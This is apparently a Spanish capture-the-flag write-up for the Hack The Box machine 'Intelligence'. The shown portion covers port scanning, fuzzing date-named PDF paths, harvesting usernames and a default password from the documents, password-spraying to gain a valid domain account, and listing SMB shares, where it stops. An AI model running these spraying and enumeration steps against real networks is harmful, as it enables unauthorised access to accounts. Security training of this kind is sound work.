---
title: Intelligence
date: 2024-10-08 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Windows
tags:
  - Abusing ReadGMSAPassword Rights (gMSADumper)
  - Pywerview Usage
  - Abusing Unconstrained Delegation
  - Abusing AllowedToDelegate Rights (getST.py) (User Impersonation)
  - Using .ccache file with wmiexec.py (KRB5CCNAME)
  - Information Leakage
  - Creating a DNS Record (dnstool.py) [Abusing ADIDNS]
  - Intercepting Net-NTLMv2 Hashes with Responder
  - BloodHound Enumeration
image:
  path: /assets/img/Intelligence/Intelligence.png
---

## Skills

- Abusing ReadGMSAPassword Rights (gMSADumper)
- Pywerview Usage
- Abusing Unconstrained Delegation
- Abusing AllowedToDelegate Rights (getST.py) (User Impersonation)
- Using .ccache file with wmiexec.py (KRB5CCNAME)
- Information Leakage
- Creating a DNS Record (dnstool.py) [Abusing ADIDNS]
- Intercepting Net-NTLMv2 Hashes with Responder
- BloodHound Enumeration
  
## Certificaciones

- OSCP
- OSEP
- eCPPTv3
  
## Descripción

`Intelligence` es una máquina de `Windows` de dificultad `media` que muestra una serie de ataques comunes en un entorno de `Active Directory`. Después de recuperar documentos `PDF` internos almacenados en el servidor web (`forzando un esquema de nombres común`) e inspeccionar su contenido y metadatos, que revelan una `contraseña` por defecto y una lista de posibles `usuarios de AD`, el `password spraying` conduce al descubrimiento de una `cuenta` válida, otorgando un `foothold` inicial en el sistema. Se descubre un `script de PowerShell` programado que envía solicitudes autenticadas a servidores web según su `nombre de host`; al agregar un `registro DNS` personalizado, es posible forzar una solicitud que puede ser interceptada para capturar el `hash` de un segundo usuario, que es fácilmente `crackeable`. Este usuario puede leer la `contraseña` de una `cuenta de servicio gestionada` por un grupo, que a su vez tiene acceso de `delegación restringida` al `controlador de dominio`, resultando en un `shell` con `privilegios administrativos`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.95.154              
PING 10.129.95.154 (10.129.95.154) 56(84) bytes of data.
64 bytes from 10.129.95.154: icmp_seq=1 ttl=127 time=38.5 ms
64 bytes from 10.129.95.154: icmp_seq=2 ttl=127 time=36.8 ms
64 bytes from 10.129.95.154: icmp_seq=3 ttl=127 time=37.2 ms
^C
--- 10.129.95.154 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 36.845/37.538/38.541/0.725 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.95.154 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 23:07 CEST
Initiating SYN Stealth Scan at 23:07
Scanning 10.129.95.154 [65535 ports]
Discovered open port 139/tcp on 10.129.95.154
Discovered open port 80/tcp on 10.129.95.154
Discovered open port 445/tcp on 10.129.95.154
Discovered open port 53/tcp on 10.129.95.154
Discovered open port 135/tcp on 10.129.95.154
Discovered open port 464/tcp on 10.129.95.154
Discovered open port 49666/tcp on 10.129.95.154
Discovered open port 49692/tcp on 10.129.95.154
Discovered open port 3268/tcp on 10.129.95.154
Discovered open port 88/tcp on 10.129.95.154
Discovered open port 593/tcp on 10.129.95.154
Discovered open port 49710/tcp on 10.129.95.154
Discovered open port 49691/tcp on 10.129.95.154
Discovered open port 3269/tcp on 10.129.95.154
Discovered open port 49713/tcp on 10.129.95.154
Discovered open port 389/tcp on 10.129.95.154
Discovered open port 9389/tcp on 10.129.95.154
Discovered open port 636/tcp on 10.129.95.154
Completed SYN Stealth Scan at 23:07, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.129.95.154
Host is up (0.038s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49666/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49710/tcp open  unknown
49713/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
           Raw packets sent: 131067 (5.767MB) | Rcvd: 36 (1.704KB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49691,49692,49710,49713 10.129.95.154 10.129.95.154 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 23:10 CEST
Nmap scan report for 10.129.95.154
Host is up (0.074s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-11 04:10:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-09-11T04:13:21+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-09-11T04:13:21+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-11T04:13:21+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-11T04:13:20+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-11T04:12:41
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap scan report for 10.129.95.154
Host is up (0.067s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-11 04:10:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-11T04:13:21+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-09-11T04:13:20+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-09-11T04:13:21+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-11T04:13:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-09-11T04:12:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Post-scan script results:
| clock-skew: 
|   6h59m59s: 
|     10.129.95.154
|_    10.129.95.154
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 189.83 seconds
```

### SMB Enumeration

Obtenemos el `nombre de la máquina` y el `dominio`

```
# netexec smb 10.129.95.154
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

Añadimos el `dominio` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.95.154   dc.intelligence.htb intelligence.htb dc

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### Web Enumeration

Al acceder a `http://10.129.95.154/` vemos esta página web

![](/assets/img/Intelligence/image_1.png)

Si nos dirigimos a la parte inferior nos podemos descargar `dos documentos PDF`

![](/assets/img/Intelligence/image_2.png)

Si examinamos esos documentos `PDF` obtenemos los nombres de los usuarios `Jose.Williams` y `William.Lee`

```
# exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:09:10 23:39:30+02:00
File Access Date/Time           : 2024:09:10 23:39:30+02:00
File Inode Change Date/Time     : 2024:09:10 23:43:19+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams

# exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:09:10 23:39:39+02:00
File Access Date/Time           : 2024:09:10 23:39:39+02:00
File Inode Change Date/Time     : 2024:09:10 23:43:19+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

Me he creado este `pequeño script` en `Python` para crearme un `diccionario personalizado`

```
from datetime import timedelta, date

file = open("/home/justice-reaper/Desktop/Intelligence/content/list_pdf.txt", "w")

def daterange(date1, date2):
    for n in range(int((date2 - date1).days) + 1):
        yield date1 + timedelta(n)

start_dt = date(2015, 1, 1)
end_dt = date(2025, 1, 1)

for dt in daterange(start_dt, end_dt):
    file.write(dt.strftime("%Y-%m-%d")+"-upload.pdf"+"\n")
file.close()

```

He `fuzzeado` en busca de `nuevas rutas`

```
# wfuzz -c -t 100 -w list_pdf.txt --hc 404 http://intelligence.htb/documents/FUZZ   
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://intelligence.htb/documents/FUZZ
Total requests: 3654

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000001830:   200        195 L    1171 W     26086 Ch    "2020-01-04-upload.pdf"                                                                                               
000001828:   200        198 L    1140 W     25596 Ch    "2020-01-02-upload.pdf"                                                                                               
000001827:   200        208 L    1172 W     25532 Ch    "2020-01-01-upload.pdf"                                                                                               
000002258:   200        138 L    556 W      10208 Ch    "2021-03-07-upload.pdf"                                                                                               
000002252:   200        134 L    573 W      10728 Ch    "2021-03-01-upload.pdf"                                                                                               
000002244:   200        213 L    1159 W     24723 Ch    "2021-02-21-upload.pdf"                                                                                               
000002276:   200        210 L    1167 W     25961 Ch    "2021-03-25-upload.pdf"                                                                                               
000002278:   200        140 L    602 W      11548 Ch    "2021-03-27-upload.pdf"                                                                                               
000002272:   200        204 L    1164 W     25460 Ch    "2021-03-21-upload.pdf"                                                                                               
000002261:   200        198 L    1118 W     23859 Ch    "2021-03-10-upload.pdf"                                                                                               
000002269:   200        202 L    1158 W     26622 Ch    "2021-03-18-upload.pdf"                                                                                               
000002233:   200        204 L    1158 W     25618 Ch    "2021-02-10-upload.pdf"                                                                                               
000002236:   200        211 L    1136 W     25660 Ch    "2021-02-13-upload.pdf"                                                                                               
000002248:   200        179 L    1140 W     25326 Ch    "2021-02-25-upload.pdf"                                                                                               
000002222:   200        193 L    1034 W     24608 Ch    "2021-01-30-upload.pdf"                                                                                               
000002191:   200        190 L    1067 W     23833 Ch    "2020-12-30-upload.pdf"                                                                                               
000002189:   200        126 L    542 W      10905 Ch    "2020-12-28-upload.pdf"                                                                                               
000002185:   200        208 L    1222 W     25507 Ch    "2020-12-24-upload.pdf"                                                                                               
000002217:   200        214 L    1178 W     26175 Ch    "2021-01-25-upload.pdf"                                                                                               
000002206:   200        136 L    548 W      10648 Ch    "2021-01-14-upload.pdf"                                                                                               
000002195:   200        205 L    1155 W     26463 Ch    "2021-01-03-upload.pdf"                                                                                               
000002181:   200        136 L    596 W      11315 Ch    "2020-12-20-upload.pdf"                                                                                               
000002176:   200        209 L    1185 W     25818 Ch    "2020-12-15-upload.pdf"                                                                                               
000002141:   200        215 L    1090 W     24145 Ch    "2020-11-10-upload.pdf"                                                                                               
000002142:   200        205 L    1212 W     25116 Ch    "2020-11-11-upload.pdf"                                                                                               
000002137:   200        219 L    1134 W     24656 Ch    "2020-11-06-upload.pdf"                                                                                               
000002132:   200        185 L    1124 W     25253 Ch    "2020-11-01-upload.pdf"                                                                                               
000002134:   200        185 L    1086 W     24309 Ch    "2020-11-03-upload.pdf"                                                                                               
000002144:   200        133 L    508 W      10588 Ch    "2020-11-13-upload.pdf"                                                                                               
000002155:   200        132 L    554 W      10863 Ch    "2020-11-24-upload.pdf"                                                                                               
000002171:   200        199 L    1153 W     25437 Ch    "2020-12-10-upload.pdf"                                                                                               
000002161:   200        206 L    1180 W     25876 Ch    "2020-11-30-upload.pdf"                                                                                               
000002092:   200        193 L    1136 W     23884 Ch    "2020-09-22-upload.pdf"                                                                                               
000002086:   200        206 L    1171 W     25619 Ch    "2020-09-16-upload.pdf"                                                                                               
000002081:   200        145 L    575 W      11526 Ch    "2020-09-11-upload.pdf"                                                                                               
000002083:   200        211 L    1133 W     25266 Ch    "2020-09-13-upload.pdf"                                                                                               
000002097:   200        226 L    1171 W     25487 Ch    "2020-09-27-upload.pdf"                                                                                               
000002099:   200        220 L    1112 W     23379 Ch    "2020-09-29-upload.pdf"                                                                                               
000002100:   200        196 L    1095 W     24739 Ch    "2020-09-30-upload.pdf"                                                                                               
000002105:   200        126 L    550 W      10745 Ch    "2020-10-05-upload.pdf"                                                                                               
000002119:   200        212 L    1219 W     25880 Ch    "2020-10-19-upload.pdf"                                                                                               
000002048:   200        143 L    577 W      11074 Ch    "2020-08-09-upload.pdf"                                                                                               
000002072:   200        202 L    1104 W     25771 Ch    "2020-09-02-upload.pdf"                                                                                               
000002042:   200        188 L    1027 W     24102 Ch    "2020-08-03-upload.pdf"                                                                                               
000002075:   200        192 L    1084 W     25101 Ch    "2020-09-05-upload.pdf"                                                                                               
000002076:   200        192 L    1100 W     24213 Ch    "2020-09-06-upload.pdf"                                                                                               
000002040:   200        204 L    1112 W     25658 Ch    "2020-08-01-upload.pdf"                                                                                               
000002059:   200        132 L    549 W      10225 Ch    "2020-08-20-upload.pdf"                                                                                               
000002074:   200        193 L    1108 W     25605 Ch    "2020-09-04-upload.pdf"                                                                                               
000002058:   200        213 L    1171 W     25542 Ch    "2020-08-19-upload.pdf"                                                                                               
000002028:   200        137 L    630 W      11520 Ch    "2020-07-20-upload.pdf"                                                                                               
000002016:   200        140 L    586 W      11368 Ch    "2020-07-08-upload.pdf"                                                                                               
000001985:   200        216 L    1162 W     26548 Ch    "2020-06-07-upload.pdf"                                                                                               
000002010:   200        201 L    1112 W     25980 Ch    "2020-07-02-upload.pdf"                                                                                               
000001990:   200        127 L    564 W      11013 Ch    "2020-06-12-upload.pdf"                                                                                               
000002006:   200        207 L    1124 W     25103 Ch    "2020-06-28-upload.pdf"                                                                                               
000001999:   200        209 L    1111 W     24765 Ch    "2020-06-21-upload.pdf"                                                                                               
000002032:   200        206 L    1083 W     24933 Ch    "2020-07-24-upload.pdf"                                                                                               
000001992:   200        185 L    1148 W     25089 Ch    "2020-06-14-upload.pdf"                                                                                               
000002008:   200        193 L    1096 W     24297 Ch    "2020-06-30-upload.pdf"                                                                                               
000002004:   200        204 L    1193 W     25968 Ch    "2020-06-26-upload.pdf"                                                                                               
000001993:   200        205 L    1212 W     25761 Ch    "2020-06-15-upload.pdf"                                                                                               
000002014:   200        182 L    1121 W     23698 Ch    "2020-07-06-upload.pdf"                                                                                               
000002003:   200        141 L    551 W      10133 Ch    "2020-06-25-upload.pdf"                                                                                               
000001986:   200        134 L    593 W      10997 Ch    "2020-06-08-upload.pdf"                                                                                               
000001982:   200        219 L    1206 W     25575 Ch    "2020-06-04-upload.pdf"                                                                                               
000001981:   200        135 L    560 W      10865 Ch    "2020-06-03-upload.pdf"                                                                                               
000001980:   200        211 L    1174 W     26456 Ch    "2020-06-02-upload.pdf"                                                                                               
000001976:   200        131 L    561 W      11016 Ch    "2020-05-29-upload.pdf"                                                                                               
000001971:   200        148 L    584 W      11311 Ch    "2020-05-24-upload.pdf"                                                                                               
000001968:   200        193 L    1165 W     24947 Ch    "2020-05-21-upload.pdf"                                                                                               
000001964:   200        206 L    1158 W     25099 Ch    "2020-05-17-upload.pdf"                                                                                               
000001950:   200        207 L    1121 W     24747 Ch    "2020-05-03-upload.pdf"                                                                                               
000001954:   200        182 L    1082 W     24719 Ch    "2020-05-07-upload.pdf"                                                                                               
000001958:   200        206 L    1161 W     25800 Ch    "2020-05-11-upload.pdf"                                                                                               
000001948:   200        193 L    1231 W     26752 Ch    "2020-05-01-upload.pdf"                                                                                               
000001898:   200        212 L    1169 W     25721 Ch    "2020-03-12-upload.pdf"                                                                                               
000001907:   200        133 L    529 W      10679 Ch    "2020-03-21-upload.pdf"                                                                                               
000001903:   200        209 L    1161 W     25873 Ch    "2020-03-17-upload.pdf"                                                                                               
000001899:   200        203 L    1026 W     23660 Ch    "2020-03-13-upload.pdf"                                                                                               
000001890:   200        201 L    1132 W     24761 Ch    "2020-03-04-upload.pdf"                                                                                               
000001891:   200        204 L    1092 W     24751 Ch    "2020-03-05-upload.pdf"                                                                                               
000001919:   200        133 L    579 W      10940 Ch    "2020-04-02-upload.pdf"                                                                                               
000001849:   200        135 L    586 W      10972 Ch    "2020-01-23-upload.pdf"                                                                                               
000001921:   200        207 L    1172 W     26535 Ch    "2020-04-04-upload.pdf"                                                                                               
000001932:   200        211 L    1153 W     25408 Ch    "2020-04-15-upload.pdf"                                                                                               
000001940:   200        211 L    1050 W     23669 Ch    "2020-04-23-upload.pdf"                                                                                               
000002000:   200        206 L    1111 W     24901 Ch    "2020-06-22-upload.pdf"                                                                                               
000001967:   200        199 L    1165 W     26127 Ch    "2020-05-20-upload.pdf"                                                                                               
000001885:   200        130 L    564 W      10959 Ch    "2020-02-28-upload.pdf"                                                                                               
000001856:   200        192 L    1136 W     25334 Ch    "2020-01-30-upload.pdf"                                                                                               
000001851:   200        192 L    1068 W     24926 Ch    "2020-01-25-upload.pdf"                                                                                               
000001881:   200        205 L    1232 W     25980 Ch    "2020-02-24-upload.pdf"                                                                                               
000001874:   200        131 L    529 W      10693 Ch    "2020-02-17-upload.pdf"                                                                                               
000001880:   200        212 L    1164 W     25994 Ch    "2020-02-23-upload.pdf"                                                                                               
000001868:   200        197 L    1106 W     23977 Ch    "2020-02-11-upload.pdf"                                                                                               
000001848:   200        223 L    1210 W     27246 Ch    "2020-01-22-upload.pdf"                                                                                               
000001846:   200        126 L    565 W      11018 Ch    "2020-01-20-upload.pdf"                                                                                               
000001836:   200        204 L    1130 W     25159 Ch    "2020-01-10-upload.pdf"
```

Nos creamos un `nuevo diccionario` con todos estos `nombres de documentos PDF` y los `descargamos`

```
# while IFS= read -r line; do wget "http://10.129.95.154/documents/$line"; done < pdf_list.txt
```

Me he descargado todos los `PDFs` y he obtenido varios `nombres de usuario` en los `metadatos` de los archivos, los cuales vamos a almacenar en un fichero llamado `users`

```
# exiftool * | grep Creator | sort -u             
Creator                         : Anita.Roberts
Creator                         : Brian.Baker
Creator                         : Brian.Morris
Creator                         : Daniel.Shelton
Creator                         : Danny.Matthews
Creator                         : Darryl.Harris
Creator                         : David.Mcbride
Creator                         : David.Reed
Creator                         : David.Wilson
Creator                         : Ian.Duncan
Creator                         : Jason.Patterson
Creator                         : Jason.Wright
Creator                         : Jennifer.Thomas
Creator                         : Jessica.Moody
Creator                         : John.Coleman
Creator                         : Jose.Williams
Creator                         : Kaitlyn.Zimmerman
Creator                         : Kelly.Long
Creator                         : Nicole.Brock
Creator                         : Richard.Williams
Creator                         : Samuel.Richardson
Creator                         : Scott.Scott
Creator                         : Stephanie.Young
Creator                         : Teresa.Williamson
Creator                         : Thomas.Hall
Creator                         : Thomas.Valenzuela
Creator                         : Tiffany.Molina
Creator                         : Travis.Evans
Creator                         : Veronica.Patel
Creator                         : William.Lee
```

Usando `pdf2text` podemos leer todo el `texto` de los `PDFs` y almacenarlos en un `archivo`

```
# pdf2txt * --outfile filtered_pdfs.txt
```

Si abrimos el `archivo` y filtramos por la palabra `pass`, vemos una `contraseña`

```
^LNew Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```

## Abusing Smb

`Validamos` las `credenciales` obtenidas `Tiffany.Molina:NewIntelligenceCorpUser9876`

```
# netexec smb 10.129.95.154 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
```

Listamos `recursos compartidos` por `SMB`

```
# netexec smb 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
